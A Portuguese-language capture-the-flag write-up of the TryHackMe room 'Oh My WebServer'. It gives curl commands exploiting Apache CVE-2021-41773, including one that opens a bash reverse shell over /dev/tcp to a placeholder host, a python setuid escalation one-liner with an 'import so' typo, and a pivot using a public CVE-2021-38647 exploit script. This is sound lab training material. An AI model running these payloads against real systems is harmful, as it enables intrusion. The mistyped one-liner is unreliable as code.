---
title: THM - Oh My WebServer
author: guialvesf
date: 2022-03-24 01:00:00 -0300
categories: [tryhackme, writeup]
tags: [tryhackme, writeup]
image: "/img/thm/ohmywebserver/banner.png"
alt: "tryhackme"
---

![banner](/img/thm/ohmywebserver/banner.png) 
<hr>

# Recon
Começando com Nmap, vamos enumerar a máquina para ver quais portas e serviços estão rodando no servidor.

* -sC - Default Nmap scripts
* -sV - Services version
* -oA - Save output to a file
* -v  - Verbose mode

![nmap](/img/thm/ohmywebserver/nmap.png)

Apenas as portas 80 e 22 estão abertas, executando um Apache 2.4.4 e um SSH respectivamente. Então vamos começar pela aplicação web.

![consult](/img/thm/ohmywebserver/consult.png)

A princípio não há nada demais, então podemos enumerar os diretórios usando o `ffuf`

`ffuf -u http://10.10.148.87/FUZZ -w /path/to/wordlist -t 90 -c`

* -u - Target URL
* -w - Wordlist file path
* -t - Number of concurrent threads
* -c - Colorize output

![ffuf](/img/thm/ohmywebserver/ffuf.png)

Encontrei dois diretório que podem ser interessantes: `assets` e `cgi-bin`

![assets](/img/thm/ohmywebserver/assets.png)

Porém a princípio não havia nada de mais

![cgi-bin](/img/thm/ohmywebserver/cgi-bin.png)

## Reverse shell

Após não encontrar muita coisa, voltei nos resultados do Nmap e notei que a versão do Apache que estava sendo executada havia uma CVE: `CVE-2021-41773`. Podemos confirmar usando o cURL.

`curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'Content-Type: text/plain; echo; whoami && id'`

![curl-first-command](/img/thm/ohmywebserver/curl_first_command.png)

Consegui um Path Traversal, no qual conseguimos executar comandos, então podemos usar o cURL e o netcat para estabelecer uma conexão reversa.

`curl 'http://10.10.148.87/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash' -d "Content-Type: text/plain; echo; bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT/ <&1'"`

![reverse-shell](/img/thm/ohmywebserver/reverse_shell.png)

## User

Recebi a conexão, porém não tem nenhum usuário no sistema e também nenhum diretório home.

![no-user](/img/thm/ohmywebserver/no-user.png)

Após passar algum tempo procurando um ponto de partida decidi usar o linPEAS, e foi onde obtive a seguinte saída:

![linpeas](/img/thm/ohmywebserver/linpeas.png)

Com isso podemos setar o UID usando o python.

`python3 -c 'import so; os.setuid(0); os.system("/bin/bash")'`

![setuid](/img/thm/ohmywebserver/user.png)

## Root

Após a enumeração olhei novamente a saída do linPEAS, e foi onde econtrei algo interessante: há outro endereço IP. Então podemos usar o Nmap para enumerar esse host. Você pode baixar o binário [aqui](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64).

`nmap -v 172.17.0.0-5`

Esse comando vai fazer um scan do host 0 ao 5, e saída nos mostra que o host 172.17.0.1 está ativo.

![nmap_ntw](/img/thm/ohmywebserver/nmap_ntw.png)

Enumerando todas as 65535 portas o scan apontou duas portas abertas: `5985` e `5986`

![nmap_nports](/img/thm/ohmywebserver/nmap_nports.png) 

Com isso temos outra CVE: `CVE-2021-38647`, na qual podemos usar um script já pronto para explorar a falha. Você pode baixar o script [aqui](https://github.com/AlteredSecurity/CVE-2021-38647).

![omigod](/img/thm/ohmywebserver/omigod.png)

O scrip executa comandos na máquina alvo, então podemos passá-los na execução como argumento, lendo a flag de root.

![root](/img/thm/ohmywebserver/root.png)
